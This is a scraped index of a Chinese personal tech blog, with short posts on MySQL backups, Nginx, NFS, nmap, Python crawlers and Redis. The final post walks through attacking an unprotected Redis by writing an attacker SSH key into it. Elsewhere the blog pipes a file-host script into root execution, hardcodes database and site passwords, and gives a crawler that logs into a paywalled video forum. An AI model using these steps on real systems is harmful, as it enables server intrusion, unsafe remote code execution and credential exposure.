cd /data/back # lsky 为要恢复的数据库，回车后输入该用户的数据库密码即可 gunzip &lt; lsky_2021-08-19.sql.gz | mysql -u colzry -p lsky 3. 对Docker里的数据库备份 3.1 本地版 #!/bin/bash backdir=/data/back # 定义备份文件存放目录 d=`date +%F` # 以日期(Y-M-D)为命名格式 user=colzry # 数据库用户名 (!自行更改) passwd=colzry_admin # 密码 (!自行更改) # 检查本地文件夹是否存在 if [ ! -d $backdir ];then mkdir -p $backdir fi docker exec mysql sh -c &#39;exec mysqldump -u&#39;${user}&#39; -p&#39;${passwd}&#39; -A&#39; &gt; $backdir/$d.sql cd $backdir # 对备份文件进行压缩 gzip $d.sql # 对备份时间超过10天的文件进行删除 find ./ -name &#34;*.gz&#34; -mtime +10 | xargs rm -f 3.2 远程版 #!/bin/bash backdir=/data/back # 定义备份文件存放目录 d=`date +%F` # 以日期(Y-M-D)为命名格式 user=colzry # 数据库用户名 (!自行更改) passwd=colzry_admin # 密码 (!自行更改) host=root@47.120.35.102 # 服务器用户名和地址，使用前先上传ssh公钥 # 检查本地文件夹是否存在 if [ ! -d $backdir ];then mkdir -p $backdir fi docker exec mysql sh -c &#39;exec mysqldump -u&#39;${user}&#39; -p&#39;${passwd}&#39; -A&#39; &gt; $backdir/$d.sql cd $backdir # 对备份文件进行压缩 gzip $d.sql # 对备份时间超过10天的文件进行删除 find ./ -name &#34;*.gz&#34; -mtime +10 | xargs rm -f # 上传文件到服务器 rsync -av $d.sql.gz $host:$backdir   ]]></content></entry><entry><title>MySQL一键安装脚本</title><url>/posts/mysql/mysql%E4%B8%80%E9%94%AE%E5%AE%89%E8%A3%85%E8%84%9A%E6%9C%AC/</url><categories><category>MySQL</category></categories><tags><tag>MySQL</tag></tags><content type="html"><![CDATA[  1. 安装脚本 wget https://files.catbox.moe/lwh5vs.sh -O /root/install-mysql.sh &amp;amp;&amp;amp; chmod +x /root/install-mysql.sh &amp;amp;&amp;amp; /root/install-mysql.sh 2. 默认密码 user: root password: admin
3. 其他方式 下载不了的话，运行下面脚本
3.1 使用yum的(建议使用) #!/bin/bash . /etc/init.d/functions SRC_DIR=`pwd` #MYSQL=&amp;#39;mysql-5.7.33-linux-glibc2.12-x86_64.tar.gz&amp;#39; MYSQL=&amp;#39;mysql-5.7.35-linux-glibc2.12-x86_64.tar.gz&amp;#39; COLOR=&amp;#39;echo -e \E[01;31m&amp;#39; END=&amp;#39;\E[0m&amp;#39; MYSQL_ROOT_PASSWORD=admin check (){ if [ $UID -ne 0 ]; then action &amp;#34;当前用户不是root,安装失败&amp;#34; false exit 1 fi cd $SRC_DIR `wget -c https://repo.huaweicloud.com/mysql/Downloads/MySQL-5.7/mysql-5.7.35-linux-glibc2.12-x86_64.tar.gz` if [ ! -e $MYSQL ];then $COLOR&amp;#34;缺少${MYSQL}文件&amp;#34;$END $COLOR&amp;#34;请将相关软件放在${SRC_DIR}目录下&amp;#34;$END exit elif [ -e /usr/local/mysql ];then action &amp;#34;数据库已存在，安装失败&amp;#34; false exit else return fi } install_mysql(){ $COLOR&amp;#34;开始安装MySQL数据库...&amp;#34;$END yum -y -q install chkconfig libncurses* libaio numactl-libs libaio …  ]]></content></entry><entry><title>Netty入门</title><url>/posts/%E4%B8%BB%E6%B5%81%E6%A1%86%E6%9E%B6%E5%92%8C%E4%B8%AD%E9%97%B4%E4%BB%B6/netty/</url><categories><category>框架和中间件</category></categories><tags><tag>Netty</tag></tags><content type="html"> 0. 前提知识 BIO、NIO和AIO这三个概念分别对应三种通讯模型：阻塞、非阻塞、非阻塞异步 这三个概念的区别如下：
BIO：一个连接一个线程，客户端有连接请求时服务器端就需要启动一个线程进行处理,线程开销大 NIO：一个请求一个线程，客户端发送的连接请求会注册到多路复用器上，多路复用器轮询到该连接有I/O请求时才启动一个线程进行处理 AIO：一个有效请求一个线程，客户端的I/O请求都是由OS先完成了再通知服务器应用去启动线程进行处理 通俗地概括一下就是：
BIO是面向流的，NIO是面向缓冲区的 BIO的各种流是阻塞的，而NIO是非阻塞的 BIO的Stream是单向的，而NIO的channel是双向的 NIO的的显著特点： 事件驱动模型、单线程处理多任务、非阻塞I/O，I/O读写不再阻塞，而是返回0、基于block的传输比基于流的传输更高效、更高级的IO函数zero-copy、IO多路复用大大提高了Java网络应用的可伸缩性和实用性
1. 认识Netty 1.1 介绍 Netty是一个Java NIO技术的开源异步事件驱动的网络编程框架，用于快速开发可维护的高性能协议服务器和客户端。 官网：https://netty.io/
1.2 特点 Netty特点：
高并发：基于 NIO（Nonblocking IO，非阻塞IO）开发，对比于 BIO（Blocking I/O，阻塞IO），他的并发性能得到了很大提高 传输快：传输依赖于零拷贝特性，尽量减少不必要的内存拷贝，实现了更高效率的传输 封装好：封装了 NIO 操作的很多细节，提供了易于使用调用接口 Netty优点：
使用简单：封装了 NIO 的很多细节，使用更简单 功能强大：预置了多种编解码功能，支持多种主流协议 扩展性强：可以通过 ChannelHandler 对通信框架进行灵活地扩展 性能优异：通过与其他业界主流的 NIO 框架对比，Netty 的综合性能最优 运行稳定：Netty 修复了已经发现的所有 NIO 的 bug，让开发人员可以专注于业务本身 社区活跃：Netty 是活跃的开源项目，版本迭代周期短，bug 修复速度快 Netty高性能表现：
IO 线程模型：同步非阻塞，用最少的资源做更多的事 内存零拷贝：尽量减少不必要的内存拷贝，实现了更高效率的传输 内存池设计：申请的内存可以重用，主要指直接内存。内部 …</content></entry><entry><title>NFS服务搭建</title><url>/posts/linux%E6%9C%8D%E5%8A%A1/nfs%E6%9C%8D%E5%8A%A1%E6%90%AD%E5%BB%BA/</url><categories><category>Linux</category></categories><tags><tag>Linux</tag><tag>服务搭建</tag><tag>NFS</tag></tags><content type="html"><![CDATA[  1.安装服务端 # Debian sudo apt install nfs-kernel-server # RedHat sudo yum install rpcbind nfs-utils 2. 更改配置文件 sudo vim /etc/exports 填入一下内容
# * 表示允许任何网段 IP 的系统访问该 NFS 目录 /nfs *(rw,sync,no_root_squash) 配置说明
NFS配置参数权限： ro 只读访问 rw 读写访问 --------------- sync 同步方式存储数据直接将数据保存到磁盘（数据存储安全） async 异步方式存储数据直接将数据保存到内存（提高数据存储效率） all_squash 将所有用户身份都进行转换匿名用户anonymous，适合公用目录。 no_all_squash 不要将普通用户身份进行转换 root_squash 将root用户身份进行转换,root用户的所有请求映射成如anonymous用户一样的权限（默认） no_root_squas 不要将root用户身份进行转换 3.创建目录并赋予权限 sudo mkdir /nfs sudo chown nobody:nogroup /nfs sudo chmod -R 777 /nfs 4.启动NFS服务 sudo /etc/init.d/nfs-kernel-server restart 或者 systemctl restart nfs-kernel-server.service 5. 写入测试内容 echo &#34;test&#34; &gt;&gt; /nfs/test.txt 到此服务器端的安装配置完毕
6.客户端操作 安装客户端
sudo apt install nfs-common 挂载
sudo mount -t nfs 192.168.5.103:/nfs /mnt/nfs -o nolock 设置开机自动挂载
sudo vim /etc/fstab 192.168.5.103:/nfs /mnt/nfs nfs rw 0 0   ]]></content></entry><entry><title>Nginx location匹配</title><url>/posts/nginx/location%E5%8C%B9%E9%85%8D/</url><categories><category>Nginx</category></categories><tags><tag>Nginx</tag></tags><content type="html"> location语法 location [=|~|~|^~] /url/ { &amp;hellip; } 注：uri是指匹配路径， [ =| ~ | ~ | ^~ | @ ] 是指匹配规则（可选）
= : 完全匹配，表示精确匹配后面的url ^~ : 无正则普通匹配（ ^ 表示“非”，~ 表示“正则”，字符意思是：不会继续匹配正则），表示普通字符匹配，如果该选项匹配，只匹配该选项，不匹配别的选项，一般用来匹配目录 / : 普通匹配（/xxx） ~ : 表示正则匹配，区分大小写 ~* : 表示正则匹配，不区分大小写 @ : “@” 定义一个命名的 location，使用在内部定向时，例如 error_page
= 进行普通字符精确匹配。也就是完全匹配。 ^~ 前缀匹配。如果匹配成功，则不再匹配其他location。 ~ 表示执行一个正则匹配，区分大小写 ~* 表示执行一个正则匹配，不区分大小写 /xxx/ 常规字符串路径匹配 / 通用匹配，任何请求都会匹配到
1. 匹配的先后顺序 = 前缀的指令严格匹配这个查询，优先级最高，一旦匹配成功，则停止搜索其他localtion的匹配项； 所有剩下的常规字符串（^~和普通匹配），‘最长命中’规则，优先使用匹配最长的结果。 正则表达式，在配置文件中定义的顺序 注： ^~ 和普通匹配。使用前缀匹配，不支持正则表达式，如果有多个location匹配成功的话，不会终止匹配过程，会记忆表达式最长的那个，如果得到的最长的location为 ^~ 类型，则表示阻断正则表达式，不再匹配正则表达式。如果得到的最长的location不是 ^~ 类型，继续匹配正则表达式，只要有一个正则成功，则使用这个正则的location，立即返回结果，并结束解析过程。
location = / { # 精确匹配/，主机名后面不能带任何字符串 / [ configuration A ] } location / { # 匹配所有以 / 开头的请求。 # 但是如果有更长的同类型的表达式，则选择更长的表达式。 # 如果有正则表达式可以匹配，则优先匹配正则表达式。 [ configuration B ] } location /documents/ { # 匹配所有以 /documents/ 开头的请求，匹配符合以后，还要继续往下搜索。 # 但是如果有更长的同类型的表达式，则选择更长的表达式。 # 如果有正则表达式可以匹配，则优先匹配正则表达式。 [ configuration C ] } location ^~ /images/ { # 匹配所有以 /images/ 开头的表达式，如果匹配成功，则停止匹配查找，停止搜索。 # 所以，即便有符合的正则表达式location，也不会被使用 [ configuration D ] } location ~* \.(gif|jpg|jpeg)$ { # 匹配所有以 gif jpg jpeg结尾的请求。 # 但是 以 /images/开头的请求，将使用 Configuration D，D具有更高的优先级 [ configuration E ] } location /images/ { # 字符匹配到 /images/，还会继续往下搜索 [ configuration F ] } location = /test.htm { root /usr/local/var/www/htm; index index.htm; } https://blog.csdn.net/beichengliulixue/article/details/121971227 https://zhuanlan.zhihu.com/p/389438482</content></entry><entry><title>Nginx 常用命令</title><url>/posts/nginx/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url><categories><category>Nginx</category></categories><tags><tag>Nginx</tag></tags><content type="html"> nginx -t 测试配置文件 nginx -s reload 修改配置后重载生效 nginx -s reopen 重新打开日志文件 nginx -s stop 快速停止 nginx -s quit</content></entry><entry><title>Nginx 高级配置</title><url>/posts/nginx/%E9%AB%98%E7%BA%A7%E9%85%8D%E7%BD%AE/</url><categories><category>Nginx</category></categories><tags><tag>Nginx</tag></tags><content type="html"><![CDATA[  高级配置 原文地址：https://juejin.cn/post/7112826654291918855
1. Nginx反向代理-负载均衡 首先通过SpringBoot+Freemarker快速搭建一个WEB项目：springboot-web-nginx，然后在该项目中，创建一个IndexNginxController.java文件，逻辑如下：
@Controller public class IndexNginxController { @Value(&amp;#34;${server.port}&amp;#34;) private String port; @RequestMapping(&amp;#34;/&amp;#34;) public ModelAndView index(){ ModelAndView model = new ModelAndView(); model.addObject(&amp;#34;port&amp;#34;, port); model.setViewName(&amp;#34;index&amp;#34;); return model; } } 在该Controller类中，存在一个成员变量：port，它的值即是从application.properties配置文件中获取server.port值。当出现访问/资源的请求时，跳转前端index页面，并将该值携带返回。
前端的index.ftl文件代码如下：
&amp;lt;html&amp;gt; &amp;lt;head&amp;gt; &amp;lt;title&amp;gt;Nginx演示页面&amp;lt;/title&amp;gt; &amp;lt;link href=&amp;#34;nginx_style.css&amp;#34; rel=&amp;#34;stylesheet&amp;#34; type=&amp;#34;text/css&amp;#34;/&amp;gt; &amp;lt;/head&amp;gt; &amp;lt;body&amp;gt; &amp;lt;div style=&amp;#34;border: 2px solid red;margin: auto;width: 800px;text-align: center&amp;#34;&amp;gt; &amp;lt;div id=&amp;#34;nginx_title&amp;#34;&amp;gt; &amp;lt;h1&amp;gt;欢迎来到熊猫高级会所，我是竹子${port}号！&amp;lt;/h1&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;/div&amp;gt; …  ]]></content></entry><entry><title>Nginx常用配置</title><url>/posts/nginx/%E5%B8%B8%E7%94%A8%E9%85%8D%E7%BD%AE/</url><categories><category>Nginx</category></categories><tags><tag>Nginx</tag></tags><content type="html"><![CDATA[  1. 跨域配置 server { listen 80; server_name localhost 127.0.0.1; location / { # 允许跨域请求的“域”，此处可以填具体域名、地址或通配符* add_header &#39;Access-Control-Allow-Origin&#39; $http_origin always; # 允许客户端提交Cookie add_header &#39;Access-Control-Allow-Credentials&#39; &#39;true&#39;; # 允许客户端的请求方法 add_header &#39;Access-Control-Allow-Methods&#39; &#39;GET, POST, OPTIONS, DELETE, PUT&#39;; # 允许客户端提交的的请求头 add_header &#39;Access-Control-Allow-Headers&#39; &#39;Origin, x-requested-with, Content-Type, Accept, Authorization&#39;; # 允许客户端访问的响应头 add_header &#39;Access-Control-Expose-Headers&#39; &#39;Cache-Control, Content-Language, Content-Type, Expires, Last-Modified, Pragma&#39;; # 处理预检请求 if ($request_method = &#39;OPTIONS&#39;) { # 预检请求缓存时间 add_header &#39;Access-Control-Max-Age&#39; 1728000; add_header &#39;Content-Type&#39; &#39;text/plain; charset=utf-8&#39;; add_header &#39;Content-Length&#39; 0; return 204; } # 服务端访问路径 proxy_pass http://127.0.0.1:8080; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; proxy_connect_timeout 600; proxy_read_timeout 600; } } 2. 80端口重定向443 server{ ssl on; listen 443; server_name pan.gossip.tk; ssl_certificate /root/cert.crt; ssl_certificate_key /root/private.key; ssl_session_timeout 5m; ssl_protocols TLSv1 TLSv1.1 TLSv1.2; ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:HIGH:!aNULL:!MD5:!RC4:!DHE; ssl_prefer_server_ciphers on; location / { proxy_pass http://127.0.0.1:5210; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; } } server { listen 80; server_name pan.gossip.tk; rewrite ^(.*)$ https://$host$1 permanent; }   ]]></content></entry><entry><title>Nmap主机扫描</title><url>/posts/linux%E6%93%8D%E4%BD%9C/nmap%E4%B8%BB%E6%9C%BA%E6%89%AB%E6%8F%8F/</url><categories><category>Linux</category></categories><tags><tag>Linux</tag><tag>工具使用</tag></tags><content type="html"> ICMP协议探测 nmap -sn -PE -T4 192.168.5.0/24 ARP协议探测 nmap -sn -PR 192.168.5.0/24</content></entry><entry><title>PicGo配置阿里云OSS</title><url>/posts/%E5%85%B6%E4%BB%96/picgo%E9%85%8D%E7%BD%AE%E9%98%BF%E9%87%8C%E4%BA%91oss/</url><categories><category>Other</category></categories><tags><tag>PicGo</tag><tag>OSS</tag></tags><content type="html"> 1. 打开阿里云RAM访问控制，创建用户 访问链接： https://ram.console.aliyun.com/users 2. 给用户添加权限 3. 打开Bucket列表创建Bucket 链接： https://oss.console.aliyun.com/bucket 4. 点击用户中心，查看或创建KeyId 5. 配置PicGo 6. 我的配置</content></entry><entry><title>pip换源</title><url>/posts/python/pip%E6%8D%A2%E6%BA%90/</url><categories><category>Python</category></categories><tags><tag>Python</tag><tag>pip</tag></tags><content type="html"> 安装pip 安装脚本链接 python get-pip.py install Linux Linux下，修改 ~/.pip/pip.conf (没有就创建一个文件夹及文件。文件夹要加“.”，表示是隐藏文件夹) 内容如下：
[global] index-url = https://pypi.tuna.tsinghua.edu.cn/simple [install] trusted-host = https://pypi.tuna.tsinghua.edu.cn Windows windows下，直接在user目录中创建一个pip目录，如：C:\Users\xx\pip，然后新建文件pip.ini，即 %HOMEPATH%\pip\pip.ini，在pip.ini文件中输入以下内容（以豆瓣镜像为例）：
[global] index-url = http://pypi.douban.com/simple [install] trusted-host = pypi.douban.com</content></entry><entry><title>Python奇淫技巧</title><url>/posts/python/python%E5%A5%87%E6%B7%AB%E6%8A%80%E5%B7%A7/</url><categories><category>Python</category></categories><tags><tag>Python</tag></tags><content type="html"><![CDATA[  1. 交换 # 交换 a = 3 b = 5 print(f&#39;a: {a}, b: {b}&#39;) a, b = b, a print(f&#39;a: {a}, b: {b}&#39;) # 输出 a: 3, b: 5 a: 5, b: 3 2. yield的使用 # yield的使用 def fibonacci(n): a = 0 b = 1 for _ in range(n): yield a a, b = a+b, a for i in fibonacci(10): print(i) # 输出 0 1 1 2 3 5 8 13 21 34 3. 列表循环 # 列表循环 list = [1, 3, 5, 7, 9] for li in list: print(li) # 进阶使用 for index, value in enumerate(list): print(f&#34;索引: {index}, 值: {value}&#34;) # 输出 1 3 5 7 9 索引: 0, 值: 1 索引: 1, 值: 3 索引: 2, 值: 5 索引: 3, 值: 7 索引: 4, 值: 9 4. 字典合并 # 字典合并 x = {&#39;1&#39;: &#39;admin&#39;, &#39;2&#39;: &#39;mike&#39;} y = {&#39;3&#39;: &#39;lula&#39;, &#39;4&#39;: &#39;lihua&#39;} z = {**x, **y} print(z) # 输出 {&#39;1&#39;: &#39;admin&#39;, &#39;2&#39;: &#39;mike&#39;, &#39;3&#39;: &#39;lula&#39;, &#39;4&#39;: &#39;lihua&#39;} 5. 三元运算符 # 三元运算符 # Ture if 条件 else False a = 10 b = 20 print(a) if a &lt; b else print(b) # 输出 10 6. 序列解包 # 序列解包 # eg1: name = &#34;Yong Zhong&#34; last_name, fist_name = name.split() print(f&#34;fist_name: {fist_name}, last_name: {last_name}&#34;) # eg2: list = [1, 2, 3] a, b, c = list print(a, b, c) # 输出 fist_name: Zhong, last_name: Yong 1 2 3 7. 关闭流 # with语句 # 相对于关闭流 with open(&#39;./test.txt&#39;, &#39;r+&#39;) as fp: str = fp.readline() print(str)   ]]></content></entry><entry><title>Python视频爬虫</title><url>/posts/python/python-%E8%A7%86%E9%A2%91%E7%88%AC%E8%99%AB/</url><categories><category>Python</category></categories><tags><tag>Python</tag><tag>爬虫</tag></tags><content type="html"><![CDATA[  import requests from lxml import etree import re import os import aiohttp import aiofiles import asyncio import shutil from Crypto.Cipher import AES headers = { &#39;user-agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) &#39; &#39;AppleWebKit/537.36 (KHTML, like Gecko) &#39; &#39;Chrome/91.0.4472.106 Safari/537.36&#39; } # 下载地址 path = &#34;D:/COLI/&#34; def login(url): session = requests.session() url = url + &#39;login.php?&#39; data = { &#39;pwuser&#39;: &#39;小车车压槽&#39;, &#39;pwpwd&#39;: &#39;qazwsxedc&#39;, &#39;hideid&#39;: 0, &#39;cktime&#39;: &#39;31536000&#39;, &#39;forward&#39;: &#39;https://www.d5034af6f919.xyz/&#39;, &#39;jumpurl&#39;: &#39;https://www.d5034af6f919.xyz/&#39;, &#39;step&#39;: 2 } session.post(url=url, data=data, headers=headers) return session # 封装网络请求 def requ(session, url): resp = session.get(url=url, headers=headers) resp.encoding = &#39;utf-8&#39; return resp # 使用模块区的链接获取 def serach_tody(session, url): today_url = url + &#39;&amp;search=today&#39; resp = requ(session, today_url) tree = etree.HTML(resp.text) tag_list = tree.xpath(&#39;//tr[@class=&#34;tr3 t_one tac&#34;]&#39;) link_list = [] print(&#39;------------------------今日内容--------------------------&#39;) for index, tag in enumerate(tag_list): title = tag.xpath(&#39;./td[2]/h3/a/text()&#39;)[0] time = tag.xpath(&#39;./td[3]/div/text()&#39;)[0] link = tag.xpath(&#39;./td[2]/h3/a/@href&#39;)[0] print(f&#39;{index}.----------------------------------------------{title} {time}&#39;) link_list.append(link) return link_list # 使用页面page的链接获取 def get_video_url(session, url): resp = requ(session, url) tree = etree.HTML(resp.text) video_url = tree.xpath(&#39;//*[@id=&#34;iframe1&#34;]/@src&#39;)[0] return video_url # 使用video的链接获取m3u8文件 def get_m3u8_url(session, url): resp = requ(session, url) rexp = re.compile(r&#34;url: &#39;(?P&lt;url&gt;.*?)\?t=3&#39;,&#34;, re.S) page_source = resp.text m3u8_url = rexp.search(page_source).group(&#34;url&#34;) rexp = re.compile(r&#34;&lt;title&gt;(?P&lt;title&gt;.*?)&lt;/title&gt;&#34;, re.S) title = rexp.search(page_source).group(&#34;title&#34;) return title, m3u8_url # 使用m3u8的链接下载 def down_m3u8(name, url): print(&#39;开始下载&#39;, name) if not os.path.exists(path + &#39;M3U8/&#39;): os.makedirs(path + &#39;M3U8/&#39;) file_path = path + &#39;M3U8/&#39; + name + &#39;.m3u8&#39; data = requests.get(url=url, headers=headers).content with open(file_path, &#39;wb&#39;) as f: f.write(data) print(name + &#39;.m3u8下载成功&#39;) async def down_ts(url, name, ts_key, session, title): file_path = path + &#39;Ts/&#39; + title.replace(&#34; &#34;, &#34;&#34;) + &#39;/&#39; if not os.path.exists(file_path): os.mkdir(file_path) aes = AES.new(key=ts_key, mode=AES.MODE_CBC) async with session.get(url) as resp: async with aiofiles.open(f&#39;{file_path}/{name}&#39;, mode=&#39;wb&#39;) as f: data = await resp.content.read() await f.write(aes.decrypt(data)) print(f&#39;{name}下载完成&#39;) def get_ts_key(url): ts_key = requests.get(url=url, headers=headers).content return ts_key async def down_video(name, ts_domain): tasks = [] file_path = path + &#39;M3U8/&#39; + name + &#39;.m3u8&#39; async with aiohttp.ClientSession() as session: async with aiofiles.open(file_path, mode=&#39;r&#39;, encoding=&#39;utf-8&#39;) as f: async for line in f: if &#39;.key&#39; in line: rexp = re.compile(r&#39;URI=&#34;(?P&lt;key_url&gt;.*?)&#34;,&#39;, re.S) key_url = rexp.search(line).group(&#34;key_url&#34;) ts_key = get_ts_key(ts_domain + key_url) if line.startswith(&#34;#&#34;): continue # 去掉多余的空格和换行 line = line.strip() # 拿到正真的ts地址 ts_url = ts_domain + line # 创建异步任务 task = asyncio.create_task(down_ts(ts_url, line, ts_key, session, title)) # 加入任务列表 tasks.append(task) await asyncio.wait(tasks) def merge_ts(name): print(f&#39;正在合并{name}.mp4 请稍后...........&#39;) name = name.replace(&#34; &#34;, &#34;&#34;) video_path = f&#39;{path}Video/&#39; if not os.path.exists(video_path): os.mkdir(video_path) os.chdir(path + &#39;/Ts/&#39; + name) os.system(f&#39;copy /b *.ts ..\\..\\Video\\{name}.mp4&#39;) print(f&#39;{name}.mp4 合并成功&#39;) if __name__ == &#39;__main__&#39;: # 进入地址 domain = &#39;https://www.d5034af6f919.xyz/&#39; print(&#39;正在登录，请稍后..........&#39;) # 拿到登录的会话 session = login(domain) # 进入主页 index_url = domain + &#39;index.php&#39; resp = requ(session, index_url) tree = etree.HTML(resp.text) # 拿到用户名 user = tree.xpath(&#39;//*[@id=&#34;header&#34;]/div[2]/span/text()&#39;)[0] # 拿到vip区的地址 vip_link = domain + tree.xpath(&#39;//*[@id=&#34;cate_1&#34;]/tr[2]/th[1]/h2/a/@href&#39;)[0] print(&#39;登录成功&#39;) print(&#39;用户名：&#39;, user) print(&#39;正在进入vip影视区.........&#39;) links = serach_tody(session, vip_link) if not os.path.exists(path + &#39;Ts/&#39;): os.mkdir(path + &#39;Ts/&#39;) else: shutil.rmtree(path + &#39;Ts/&#39;) os.mkdir(path + &#39;Ts/&#39;) loop = True while loop: index = int(input(&#39;请选择你要下载的索引[-1退出]：&#39;)) if index == -1: break elif index &lt; -1 and index &gt; len(links): index = int(input(&#39;你的输入有误，请重新输入[-1退出]：&#39;)) else: page_url = domain + links[index] video_url = domain + get_video_url(session, page_url) title, m3u8_url = get_m3u8_url(session, video_url) print(m3u8_url) m3u8_domain = m3u8_url.rsplit(&#39;/&#39;, 1)[0] + &#39;/&#39; down_m3u8(title, m3u8_url) asyncio.run(down_video(title, m3u8_domain)) merge_ts(title)   ]]></content></entry><entry><title>Python图片爬虫</title><url>/posts/python/python-%E5%9B%BE%E7%89%87%E7%88%AC%E8%99%AB/</url><categories><category>Python</category></categories><tags><tag>Python</tag><tag>爬虫</tag></tags><content type="html"><![CDATA[  图片爬取1.1 import requests import os from lxml import etree headers = { &amp;#39;user-agent&amp;#39;: &amp;#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) &amp;#39; &amp;#39;AppleWebKit/537.36 (KHTML, like Gecko) &amp;#39; &amp;#39;Chrome/91.0.4472.106 Safari/537.36&amp;#39; } def request(url): response = requests.get(url=url, headers=headers) # 中文乱码处理 response.encoding = &amp;#39;utf-8&amp;#39; return response.text def get_link(url): tree = etree.HTML(request(url)) li_list = tree.xpath(&amp;#39;/html/body/div[2]/div[8]/ul/li&amp;#39;) # print(li_list) for li in li_list: link = &amp;#39;https://www.umei.net&amp;#39; + li.xpath(&amp;#39;./a/@href&amp;#39;)[0] file_name = li.xpath(&amp;#39;./a/span/text()&amp;#39;)[0] print(&amp;#39;开始下载:&amp;#39; + file_name) path = &amp;#39;D:/Img/&amp;#39;+file_name if not os.path.exists(path): os.mkdir(path) img_src,next_page = get_allSrc(link) while next_page != &amp;#39;&amp;#39;: img_download(path,img_src) img_src, next_page = get_allSrc(next_page) def get_allSrc(url): tree = etree.HTML(request(url)) src = …  ]]></content></entry><entry><title>RabbitMQ入门</title><url>/posts/%E4%B8%BB%E6%B5%81%E6%A1%86%E6%9E%B6%E5%92%8C%E4%B8%AD%E9%97%B4%E4%BB%B6/rabbitmq%E5%85%A5%E9%97%A8/</url><categories><category>框架和中间件</category></categories><tags><tag>RabbitMQ</tag></tags><content type="html"> 1. 安装 1.1 docker安装 docker pull rabbitmq:management 默认用户名和密码：guest/guest
docker run -dit \ --name rabbitmq \ -p 5672:5672 \ -p 15672:15672 \ rabbitmq:management 端口 作用 15672 管理界面UI的使用端口 15671 管理监听端口 5672,5671 AMQP 0-9-1 without and with TLSclient端通信口 4369 (epmd)epmd代表Erlang端口映射守护进程，erlang发现口 25672 ( Erlang distribution) server间内部通信口 2. 核心内容 2.1 常用队列 2.2 工作原理 2.3 名词解释 Broker：接收和分发消息的应用，RabbitMQ Server 就是 Message Broker Virtual host：出于多租户和安全因素设计的，把 AMQP 的基本组件划分到一个虚拟的分组中，类似于网络中的 namespace 概念。当多个不同的用户使用同一个 RabbitMQ server 提供的服务时，可以划分出多个 vhost，每个用户在自己的 vhost 创建 exchange／queue 等 Connection：publisher／consumer 和 broker 之间的 TCP 连接 Channel：如果每一次访问 RabbitMQ 都建立一个 Connection，在消息量大的时候建立 TCP Connection 的开销将是巨大的，效率也较低。Channel 是在 connection 内部建立的逻辑连接，如果应用程序支持多线程，通常每个 thread 创建单独的 channel 进行通讯，AMQP method 包含了 channel id 帮助客户端和 message broker 识别 channel，所以 channel 之间是完全隔离的。Channel 作为轻量级的Connection 极大减少了操作系统建立 TCP connection 的开销 Exchange：message 到达 broker 的第一站，根据分发规则，匹配查询表中的 routing key，分发消息到 queue 中去。常用的类 …</content></entry><entry><title>Redis开启远程连接</title><url>/posts/redis/redis%E5%BC%80%E5%90%AF%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5/</url><categories><category>Redis</category></categories><tags><tag>Redis</tag></tags><content type="html"> 让防火墙打开6379端口 修改redis配置文件(/etc/redis/redis.conf) # 允许任何主机连接、访问 bind 127.0.0.1 改为 bind 0.0.0.0 # 关闭保护模式 protected-mode yes 改为 protected-mode no # 允许启动后在后台运行，即关闭命令行窗口后仍能运行 daemonize no 改为 daemonize yes 重启redis并指定配置文件 sudo /etc/init.d/redis-server restart redis-server /etc/redis/redis.conf</content></entry><entry><title>Redis设置密码</title><url>/posts/redis/redis%E8%AE%BE%E7%BD%AE%E5%AF%86%E7%A0%81/</url><categories><category>Redis</category></categories><tags><tag>Redis</tag></tags><content type="html"> 方法一：通过配置文件（/etc/redis.conf）进行设置 这种方法在设置密码后需要重启redis生效。首先找到redis的配置文件—redis.conf文件，然后修改里面的requirepass（requirepass 是配置redis访问密码的参数），这个本来是注释起来了的，将注释去掉，并将后面对应的字段设置成自己想要的密码，保存退出。重启redis服务，即可。
我这里是设置密码成了123
方法二：通过命令设置密码 这种方法相对简单，不需要重启redis服务。连接redis之后，通过命令设置，如下：
config set requirepass 123456 如此，便将密码设置成了123456
设置之后，可通过以下指令查看密码
config get requirepass 密码设置之后，当你退出再次连上redis的时候，就需要输入密码了，不然是无法操作的。这里有两种方式输入密码，一是连接的时候直接输入密码，而是连接上之后再输入密码，分别如下所示：
注：通过命令行修改了密码之后，配置文件（/etc/redis.conf）的requirepass字段后面的密码是不会随之修改的。</content></entry><entry><title>Redis挖矿</title><url>/posts/redis/redis%E6%8C%96%E7%9F%BF/</url><categories><category>Redis</category></categories><tags><tag>Redis</tag></tags><content type="html"><![CDATA[  1. 首先我们需要一些先决条件 条件一：你首先要有一个Redis，并且我们要知道他的端口【默认6379】； 条件二：Redis的密码不能过于复杂，或者没有密码； 条件三：启动Redis的用户最好是Root用户，这样破坏性更大； 2. 创建密钥对 [root@fedora ~]# ssh-keygen Generating public/private rsa key pair. Enter file in which to save the key (/root/.ssh/id_rsa): Created directory &#39;/root/.ssh&#39;. Enter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in /root/.ssh/id_rsa Your public key has been saved in /root/.ssh/id_rsa.pub The key fingerprint is: SHA256:W97/OpnQued99LuJ2+4R4yrVAoPqxJ+PcYj5ZBvEjAE root@fedora The key&#39;s randomart image is: +---[RSA 3072]----+ | E | | . | | . . | | =. o | | ..S+. o..+ | | +++...o+.+| | ooo*o.o..B.| | .+o*. .O B| | +...+*&amp;B| +----[SHA256]-----+ 3. 通过公钥生成攻击键值 (echo -e &#34;\n\n&#34;; cat ~/.ssh/id_rsa.pub; echo -e &#34;\n\n&#34;;) &gt; foo.txt 4. 配置Key到Redis中 cat foo.txt |redis-cli -h 192.168.243.129 -x set bar 登录Redis进行检查，是否已经写入进Redis中。
